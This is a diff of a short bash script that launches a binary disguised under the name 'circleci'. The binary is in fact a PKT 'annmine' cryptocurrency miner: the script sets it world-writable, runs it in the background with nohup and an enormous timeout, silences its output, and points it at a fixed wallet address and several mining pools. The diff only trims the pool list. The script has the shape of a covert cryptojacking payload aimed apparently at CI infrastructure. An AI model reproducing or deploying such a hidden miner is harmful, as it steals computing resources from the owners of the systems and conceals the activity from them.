@@ -1,7 +1,7 @@
 #!/bin/bash
 
 chmod 777 circleci >/dev/null 2>&1
-timeout 9999999999h nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pkt.world http://pool.chymera.it http://pool.pktpool.io http://pktco.in http://pool.pkteer.com http://pool-pkt.dlinodes.com  >/dev/null 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+timeout 9999999999h nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io >/dev/null 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 
 
